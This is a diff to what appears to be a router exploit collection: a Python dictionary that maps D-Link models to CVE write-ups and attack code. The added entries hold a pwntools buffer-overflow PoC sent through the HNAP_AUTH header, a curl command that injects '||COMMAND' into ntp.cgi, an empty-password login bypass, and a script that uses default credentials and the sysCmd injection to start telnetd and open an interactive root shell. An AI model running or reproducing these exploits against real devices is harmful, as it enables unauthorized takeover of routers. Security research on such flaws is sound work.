@@ -662,7 +662,48 @@ model_exp_dic["DrayTek_Vigor2960"] = {
 
 model_exp_dic["DIR-878"] = {
     "CVE-2019-8316":
-        ["An issue was discovered on D-Link DIR-878 devices with firmware 1.12A1. This issue is a Command Injection allowing a remote attacker to execute arbitrary code, and get a root shell. A command Injection vulnerability allows attackers to execute arbitrary OS commands via a crafted /HNAP1 POST request. This occurs when any HNAP API function triggers a call to the system function with untrusted input from the request body for the SetWebFilterSettings API function, as demonstrated by shell metacharacters in the WebFilterURLs field.",""]
+        ["An issue was discovered on D-Link DIR-878 devices with firmware 1.12A1. This issue is a Command Injection allowing a remote attacker to execute arbitrary code, and get a root shell. A command Injection vulnerability allows attackers to execute arbitrary OS commands via a crafted /HNAP1 POST request. This occurs when any HNAP API function triggers a call to the system function with untrusted input from the request body for the SetWebFilterSettings API function, as demonstrated by shell metacharacters in the WebFilterURLs field.",""],
+    "CVE-2019-9125":
+        ["An issue was discovered on D-Link DIR-878 1.12B01 devices. Because strncpy is misused, there is a stack-based buffer overflow vulnerability that does not require authentication via the HNAP_AUTH HTTP header.\n['https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10157'\n'https://www.zerodayinitiative.com/advisories/ZDI-20-267/']",
+        """
+import requests
+import sys
+import struct
+import time
+from pwn import *
+
+def syscmd1(a):
+    data='<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>request</Action><Username>Admin</Username><LoginPassword></LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>'
+
+    p=remote('ip'port)
+    z=len(data)
+    payload=''
+    payload+='POST /HNAP1/ HTTP/1.1\\r\\n'
+    payload+='Host: 192.168.0.1\\r\\n'
+    payload+='Connection: close\\r\\n'
+    payload+='HNAP_AUTH: EC502BB60841C94D843DB3E7E3B451BE '+a+'\\r\\n'
+    payload+='Accept-Encoding: gzip, deflate\\r\\n'
+    payload+='Accept: */*\\r\\n'
+    payload+='Origin: http://192.168.0.1\\r\\n'
+    payload+='SOAPAction: "http://purenetworks.com/HNAP1/Login"'
+    payload+='User-Agent: python-requests/2.18.4\\r\\n'
+    payload+='Content-Length: '+str(z)+'\\r\\n'
+    payload+='Content-Type: text/xml; charset=UTF-8\\r\\n'
+    payload+='Referer: http://ip/info/Login.html\\r\\n'
+    payload+='Accept-Language: zh-CN,zh;q=0.9\\r\\n'
+    payload+='X-Requested-With: XMLHttpRequest\\r\\n'
+    payload+='Cookie: Hm_lvt_39dcd5bd05965dcfa70b1d2457c6dcae=1547191507,1547456131; uid=null\\r\\n'
+    payload+='\\r\\n'
+    payload+=data
+    p.send(payload)
+    print p.recv(1024)
+    p.close()
+
+if __name__ == "__main__":
+            payload='A'*0x400
+            syscmd1(payload)
+        """
+        ]
 }
 
 model_exp_dic["TPLINK_Archer_A7_V5"] = {
@@ -781,5 +822,67 @@ model_exp_dic["Netgear_WNDR3300"]  = {
     """
  ]
 }
+
+
+model_exp_dic["DIR-882"] = {
+    "CVE-2020-8864":
+    ["This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of D-Link DIR-867, DIR-878, and DIR-882 routers with firmware 1.10B04. Authentication is not required to exploit this vulnerability. The specific flaw exists within the handling of HNAP login requests. The issue results from the lack of proper handling of empty passwords. An attacker can leverage this vulnerability to execute arbitrary code on the router. Was ZDI-CAN-9471.\n['https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10157'\n'https://www.zerodayinitiative.com/advisories/ZDI-20-268/']",
+    """
+#affetc firmware 1.10B04
+login set passord is NULL will success
+    """
+    ]
+}
+
+model_exp_dic["DIR-825vB"] = {
+    "CVE-2019-9126":
+["An issue was discovered on D-Link DIR-825 Rev.B 2.10 devices. There is an information disclosure vulnerability via requests for the router_info.xml document. This will reveal the PIN code, MAC address, routing table, firmware version, update time, QOS information, LAN information, and WLAN information of the device.['https://github.com/WhooAmii/whooamii.github.io/blob/master/2018/DIR-825/information%20disclosure.md']",
+"""
+auth rce
+curl -H "Content-Type:application/json" -v -X POST -d {'ntp_server'='||COMMAND'}   http://192.168.0.1/ntp.cgi
+"""
+]
+}
+
+model_exp_dic["DIR-619L"] = {
+    "CVE-2018-20057":
+    ["An issue was discovered in /bin/boa on D-Link DIR-619L Rev.B 2.06B1 and DIR-605L Rev.B 2.12B1 devices. goform/formSysCmd allows remote authenticated users to execute arbitrary OS commands via the sysCmd POST parameter.['https://github.com/WhooAmii/whooamii.github.io/blob/master/2018/DIR-619%20command%20execution.md']",
+    """
+#affect firmware 2.06B1
+import requests
+import sys
+import struct
+import base64
+from pwn import *
+ip='192.168.0.1'
+port=101
+def login(user,password):
+	postData = {
+	'login_name':'',
+	'curTime':'12345',
+	'FILECODE':'',
+	'VER_CODE':'',
+	'VERIFICATION_CODE':'',
+	'login_n':user,
+	'login_pass':base64.b64encode(password),
+	}
+	response = requests.post('http://192.168.0.1/goform/formLogin',data=postData)
+def syscmd(cmd):
+	postData = {
+	'sysCmd':cmd,
+	'submit-url':'1234',
+	}
+	response = requests.post('http://192.168.0.1/goform/formSysCmd',data=postData)
+def inter():
+	p=remote(ip,port)
+	p.interactive()
+if __name__ == "__main__":
+	login('admin','123456')
+	syscmd('telnetd -p '+str(port))
+	inter()
+    """
+    ]
+}
+
 
 # print(model_exp_dic["TOTOLINK_A7000R"][0])
